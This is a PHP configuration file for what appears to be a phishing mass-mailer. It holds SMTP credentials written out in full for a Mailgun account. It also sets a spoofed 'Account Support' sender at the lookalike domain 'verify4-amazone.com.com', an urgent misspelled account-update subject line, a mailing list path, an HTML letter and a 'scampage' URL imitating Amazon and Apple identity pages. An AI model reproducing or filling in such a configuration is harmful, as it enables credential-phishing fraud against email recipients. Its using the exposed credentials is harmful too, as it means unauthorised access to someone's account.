<?php

//Regards
date_default_timezone_set('Asia/Jakarta');
$date = date('F d, Y, h:i A T');

/* SMTP SETUP */
$smtp_acc = [
    [
        "host"     => "smtp.mailgun.org",
        "port"     => "587",
        "username" => "postmaster@sandbox1e1def4643a84e5f86ef271e33659b85.mailgun.org",
        "password" => "bd48e322e7025a269c7dc5d5ee499a7b-7238b007-31c6bbe4"
    ],
    [
        "host"     => "smtp.mailgun.org",
        "port"     => "587",
        "username" => "postmaster@sandbox1e1def4643a84e5f86ef271e33659b85.mailgun.org",
        "password" => "bd48e322e7025a269c7dc5d5ee499a7b-7238b007-31c6bbe4"
    ],
    [
        "host"     => "smtp.mailgun.org",
        "port"     => "587",
        "username" => "postmaster@sandbox1e1def4643a84e5f86ef271e33659b85.mailgun.org",
        "password" => "bd48e322e7025a269c7dc5d5ee499a7b-7238b007-31c6bbe4"
    ],

];

/* Features SETUP */

$gx_setup = [
    "priority"       => 1,
    "userandom"      => 0,
    "sleeptime"      => 2,
    "replacement"    => 1,
    "filesend"       => 1,
    "userremoveline" => 0,
    "mail_list"      => "file/maillist/tester.txt",
    "fromname"       => "Account Support",
    "frommail"       => "admin##randstring##verify4@verify4-amazone.com.com",
    "subject"        => "Re : [Need Update] [ Alert Information ] Your information need tu be update[FWD]",
    "msgfile"        => "file/letter/ade.html",
    "filepdf"        => "file/attachment/logo.ico",
    "scampage"       => ["https://verify-identity.amazon.com.info-appleid.com"],
];
